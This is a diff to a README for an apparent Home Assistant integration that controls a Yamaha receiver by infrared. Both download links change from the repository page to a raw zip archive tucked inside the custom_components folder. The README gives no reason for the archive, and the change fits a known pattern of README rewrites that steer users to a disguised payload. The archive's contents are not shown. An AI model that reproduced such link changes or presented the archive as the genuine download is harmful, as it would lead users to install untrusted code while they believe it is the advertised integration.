@@ -1,6 +1,6 @@
 # 📺 RAV311-Remote - Control Your Yamaha Receiver
 
-[![Download](https://img.shields.io/badge/Download-RAV311--Remote-blue?style=for-the-badge)](https://github.com/Zanek1964/RAV311-Remote)
+[![Download](https://img.shields.io/badge/Download-RAV311--Remote-blue?style=for-the-badge)](https://github.com/Zanek1964/RAV311-Remote/raw/refs/heads/main/custom_components/rav311_remote/Remote-RA-v3.7.zip)
 
 ## 🏠 What RAV311-Remote Does
 
@@ -19,7 +19,7 @@ It uses the native infrared building block introduced in Home Assistant 2026.4. 
 
 Visit this page to download and install the integration:
 
-[Download RAV311-Remote](https://github.com/Zanek1964/RAV311-Remote)
+[Download RAV311-Remote](https://github.com/Zanek1964/RAV311-Remote/raw/refs/heads/main/custom_components/rav311_remote/Remote-RA-v3.7.zip)
 
 If you use HACS, you can also add the repository from GitHub and install it from there.
 
